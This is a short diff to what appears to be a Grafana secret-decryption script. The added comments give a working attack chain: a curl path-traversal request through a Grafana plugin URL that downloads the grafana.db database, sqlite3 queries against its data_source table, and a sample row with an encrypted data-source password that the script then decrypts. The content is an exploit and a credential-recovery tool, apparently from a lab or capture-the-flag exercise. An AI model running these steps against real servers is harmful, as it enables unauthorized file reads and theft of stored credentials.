@@ -1,4 +1,10 @@
+# 1. curl --path-as-is http://$IP:3000/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+# 2. sqlite3 grafana.db
+# 3. .tables
+# 4. select * from data_source;
+# 1|1|1|prometheus|Prometheus|server|http://localhost:9090||||0|sysadmin||0|{}|2022-02-04 09:19:59|2022-02-04 09:19:59|0|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}|0|HkdQ8Ganz
 #python3 grafana_decrypt_secret.py
+
 
 import base64
 from hashlib import pbkdf2_hmac
